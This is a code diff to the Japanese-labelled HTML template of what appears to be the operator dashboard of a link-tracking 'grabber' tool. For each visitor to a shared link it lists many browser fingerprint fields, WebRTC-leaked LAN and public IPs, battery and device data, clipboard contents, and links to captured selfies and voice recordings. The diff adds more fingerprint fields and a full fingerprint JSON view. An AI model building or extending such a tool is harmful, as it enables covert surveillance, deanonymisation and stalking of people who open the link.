@@ -28,6 +28,14 @@ code.c{background:#232734;padding:2px 6px;border-radius:5px;font-size:12px}
 .flex{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
 .q{background:#171a21;border-radius:8px;padding:8px 10px;font-size:12px;margin:5px 0}
 .q b{color:#7ee08a}
+.got{font-size:11px;line-height:1.65;max-width:320px}
+.got .gl{display:block}
+.got .gk{color:#7f879b}
+.got .gv{color:#dfe4ee;word-break:break-all}
+.got details{margin-top:4px}
+.got summary{color:#8b93a7;cursor:pointer}
+.got pre{margin:4px 0 0;padding:6px;background:#11141a;border-radius:6px;
+  font-size:10px;color:#9aa3b2;max-height:200px;overflow:auto;white-space:pre-wrap}
 </style>
 {% endblock %}
 
@@ -77,6 +85,19 @@ code.c{background:#232734;padding:2px 6px;border-radius:5px;font-size:12px}
 <table>
   <tr><th>時刻</th><th>端末 / 回線</th><th>場所</th><th>位置</th><th>取得物</th><th>回答</th></tr>
   {% for h in hits %}
+  {% set FIELDS = [
+    ("lan_ip","LAN内IP"),("pub_ip","WebRTC公開IP"),("gpu","GPU"),
+    ("webgl_hash","WebGL指紋"),("canvas_fp","Canvas指紋"),("audio_fp","Audio指紋"),
+    ("fonts_n","フォント数"),("codecs","コーデック"),("media_devices","カメラ/マイク"),
+    ("storage","ストレージ"),("battery","電池残量"),("charging","充電中"),
+    ("net_type","回線種別"),("downlink","回線速度"),("rtt","RTT"),
+    ("clock_skew","時計ズレ"),("color_gamut","色域"),("refresh_hz","リフレッシュ"),
+    ("pointer","ポインタ"),("orientation","画面向き"),("cookies_on","Cookie可"),
+    ("dnt","DNT"),("permissions","権限状態"),("voices","音声一覧"),
+    ("webgpu","WebGPU"),("plugins","プラグイン"),("tz_client","端末TZ"),
+    ("lang_list","言語一覧"),("screen","画面"),("platform","プラットフォーム"),
+    ("cores","コア数"),("mem","メモリGB"),("touch","タッチ点数")
+  ] %}
   <tr>
     <td class="bot">{{ (h.ts or '')[:19] }}<br>
       {% if h.is_bot %}<span class="bot">BOT</span>{% endif %}</td>
@@ -102,10 +123,21 @@ code.c{background:#232734;padding:2px 6px;border-radius:5px;font-size:12px}
       {% if h.dwell_ms %}<br><span class="bot">滞在 {{ (h.dwell_ms // 1000) }}秒 / スクロール {{ h.scroll|round(0) if h.scroll else 0 }}%</span>{% endif %}
       {% if h.visits %}<br><span class="bot">再訪 {{ h.visits }}回目</span>{% endif %}
     </td>
-    <td>
-      {% if h.selfie %}<a href="{{ base }}/s/{{ link.code }}/f/{{ h.selfie }}" target="_blank">自撮り</a><br>{% endif %}
-      {% if h.voice %}<a href="{{ base }}/s/{{ link.code }}/f/{{ h.voice }}" target="_blank">音声</a><br>{% endif %}
-      {% if h.clip %}<span class="bot">クリップボード: {{ h.clip[:40] }}</span>{% endif %}
+    <td class="got">
+      {% for key, label in FIELDS %}{% set v = h[key] %}
+        {% if v not in (None, "", 0, "0") %}
+        <span class="gl"><span class="gk">{{ label }}</span> <span class="gv">{{ v }}</span></span>
+        {% endif %}
+      {% endfor %}
+      {% if h.fp_json %}
+      <details><summary>指紋JSON（全項目）</summary><pre>{{ h.fp_json }}</pre></details>
+      {% endif %}
+      {% if h.extra %}
+      <details><summary>extra</summary><pre>{{ h.extra }}</pre></details>
+      {% endif %}
+      {% if h.selfie %}<br><a href="{{ base }}/s/{{ link.code }}/f/{{ h.selfie }}" target="_blank">自撮り</a>{% endif %}
+      {% if h.voice %}<br><a href="{{ base }}/s/{{ link.code }}/f/{{ h.voice }}" target="_blank">音声</a>{% endif %}
+      {% if h.clip %}<br><span class="bot">クリップボード: {{ h.clip[:60] }}</span>{% endif %}
       {% if h.quiz_done %}<br><span class="bot">クイズ {{ h.quiz_score }}/{{ h.quiz_total }}</span>{% endif %}
     </td>
     <td>
